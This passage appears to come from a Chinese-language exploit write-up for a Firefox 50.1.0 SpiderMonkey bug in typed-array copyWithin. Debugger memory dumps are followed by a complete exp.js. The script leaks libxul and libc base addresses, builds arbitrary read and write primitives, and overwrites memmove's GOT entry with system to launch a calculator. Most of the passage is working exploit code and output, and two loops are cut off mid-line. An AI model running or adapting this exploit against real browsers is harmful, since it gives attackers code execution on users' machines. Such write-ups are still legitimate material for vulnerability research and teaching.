大小的，所以是以内联的方式，通过它可以泄露出`ArrayBuffer` 的地址
    0x7ffff7e851a0: 0x00007ffff7e82880      0x00007ffff7ea9240
    0x7ffff7e851b0: 0x0000000000000000      0x000055555660c2e0// vmmap 0x55555660c2e0
    0x555555554000     0x555557509000 r-xp  1fb5000 0      /mozilla/firefox-50.1.0/js/src/build_DBG.OBJ/js/src/shell/js
    // 0x00003ffffbf428f0  x/40gx 0x7fffcb243060 
     // buffer1
    0x7fffcb243060: 0x00007fffc5acb2b0      0x00007fffc5acda10          
    0x7fffcb243070: 0x0000000000000000      0x00007fffeb97ebf0          
    0x7fffcb243080: 0x00003fffe5921850      0xfff8800000000060          
    0x7fffcb243090: 0xfffe7fffcb2180c0      0xfff8800000000000          
    0x7fffcb2430a0: 0x6162636461626364      0x0000000000000000          
    0x7fffcb2430b0: 0x0000000000000000      0x0000000000000000          
    0x7fffcb2430c0: 0x0000000000000000      0x0000000000000000          
    0x7fffcb2430d0: 0x0000000000000000      0x0000000000000000          
    0x7fffcb2430e0: 0x0000000000000000      0x0000000000000000          
    0x7fffcb2430f0: 0x0000000000000000      0x00003fffe59218a0  
     //buffer2
    0x7fffcb243100: 0x00007fffc5acb2b0      0x00007fffc5acda10          
    0x7fffcb243110: 0x0000000000000000      0x00007fffeb97ebf0          
    0x7fffcb243120: 0x00003fffe59218a0      0xfff8800000000060          
    0x7fffcb243130: 0xfffe7fffcb218080      0xfff8800000000000          
    0x7fffcb243140: 0x3132333431323334      0x0000000000000000          
    0x7fffcb243150: 0x0000000000000000      0x0000000000000000   
    //....
     pwndbg> vmmap 0x00007fffeb97ebf0 
     0x7fffe7fca000     0x7fffec68c000 r-xp  46c2000 0      /usr/local/lib/firefox-50.1.0/libxul.so
###  内存读写
接下来我们的做法是尝试把`buffer2` 的数据指针，也就是上面的`0x00003fffe59218a0` 改掉，
然后就可以内存读写了，这里是把它改到`buffer1` 的起始地址, 也就是`0x7fffcb243060`, 写入的是`0x7fffcb243060 >>
1 == 0x3fffe5921830`， 保存到`buffer2` 的第一项, 指定`hax` 返回值为`0x28` ，就可以覆盖掉原来的指针
        a1_8.offset = 0;
        hax = { valueOf: function() { a1_8.offset = 0x58 ; return 0x28; } };
        a2_64[0]=i2f(buffer1_base/2);
        a1_8.copyWithin(hax,0x48,0x50);
        print(hex(f2i(a2_64[0])));
运行之后的内存布局如下(重新跑地址和前面不同)， 已经成功覆盖了， 接下来就可以用`buffer2[index] = xxx` 改 `buffer1`
的内容
    // buffer 2
    0x7fffcb243240: 0x00007fffc457abe0      0x00007fffbe951880           
    0x7fffcb243250: 0x0000000000000000      0x00007fffeb97ebf0           
    0x7fffcb243260: 0x00003fffe59218d0      0xfff8800000000060           
    0x7fffcb243270: 0xfffe7fffcb218300      0xfff8800000000000 
    // 0x00003fffe59218d0  telescope 0x7fffecae9160                                                                   
    00:0000│   0x7fffecae9160 —▸ 0x7ffff6e989b0 (__memmove_avx_unaligned) ◂— mov    rax, rdi           
    01:0008│   0x7fffecae9168 —▸ 0x7ffff6d78e60 (tolower) ◂— lea    edx, [rdi + 0x80]                     pwndbg> vmmap 0x7fffecae9160  
    0x7fffecae9000     0x7fffecb40000 rw-p    57000 4b1e000 /usr/local/lib/firefox-50.1.0/libxul.so
想下面这样，`target` 存入`/usr/bin/xcalc` , 然后执行`target.copyWithin(0, 1);`
内存中会执行类似`memmove("/usr/bin/xcalc",1)`， 然后就可以弹计算器啦 (新版本的firefox 这里的`memmove
got` 放在了rdata 段，默认不可写）
    var target = new Uint8Array(100);
        var cmd = "/usr/bin/xcalc";
        for (var i = 0; i 
      Please wait...
`exp.js`
    var conversion_buffer = new ArrayBuffer(8);
    var f64 = new Float64Array(conversion_buffer);
    var i32 = new Uint32Array(conversion_buffer);
    var BASE32 = 0x100000000;
    function f2i(f) {
        f64[0] = f;
        return i32[0] + BASE32 * i32[1];
    }
    function i2f(i) {
        i32[0] = i % BASE32;
        i32[1] = i / BASE32;
        return f64[0];
    }
    function hex(addr){
        return '0x'+addr.toString(16);
    }
    function print(msg) {
        console.log(msg);
        document.body.innerText += 'n[+]: '+msg ;
    }
    function pwn(){
        buffer1 =  new ArrayBuffer(0x60);
        buffer2 =  new ArrayBuffer(0x60);
        a1_8 = new Uint8Array(buffer1);
        a1_32 = new Uint32Array(buffer1);
        a1_64 = new Float64Array(buffer1);
        a2_8 = new Uint8Array(buffer2);
        a2_32 = new Uint32Array(buffer2);
        a2_64 = new Float64Array(buffer2);
        a1_32[0]=0x61626364;
        a1_32[1]=0x61626364;
        a2_32[0]=0x31323334;
        a2_32[1]=0x31323334;
        hax = { valueOf: function() { a1_8.offset = 0x58 ; return 0x0; } };
        a1_8.copyWithin(hax,0x20,0x28);
        xul_base = f2i(a1_64[11]) -0x39b4bf0;
        memmove_got = xul_base + 0x000004b1f160
        print("xul_base "+hex(xul_base));
        // 0x7fffecae9160
        print("memmove_got "+hex(memmove_got));
        a1_8.offset = 0;
        a1_8.copyWithin(hax,0x28,0x30);
        buffer1_base = f2i(a1_64[11])*2 - 0xe0;
        print("buffer1_base "+hex(buffer1_base));
        a1_8.offset = 0;
        hax = { valueOf: function() { a1_8.offset = 0x58 ; return 0x28; } };
        a2_64[0]=i2f(buffer1_base/2);
        a1_8.copyWithin(hax,0x48,0x50);
        print(hex(f2i(a2_64[0])));
        // leak libc addr
        function read64(addr){
            a2_32 = new Uint32Array(buffer2);
            a2_64 = new Float64Array(buffer2);
            a2_32[10]=0x1000;
            a2_64[4]=i2f(addr/2);
            leak = new Float64Array(buffer1);
            return f2i(leak[0]);
        }
        function write64(addr,data){
            a2_32 = new Uint32Array(buffer2);
            a2_64 = new Float64Array(buffer2);
            a2_32[10]=0x1000;
            a2_64[4]=i2f(addr/2);
            towrite = new Float64Array(buffer1);
            towrite[0] = i2f(data);
        }
        memmove_addr =  read64(memmove_got) ;
        libc_base =  memmove_addr -  0x14d9b0;
        system_addr = libc_base + 0x0000000000045390;
        print("libc_base "+hex(libc_base));
        print("system_addr "+hex(system_addr));
        var target = new Uint8Array(100);
        var cmd = "/usr/bin/xcalc";
        for (var i = 0; i 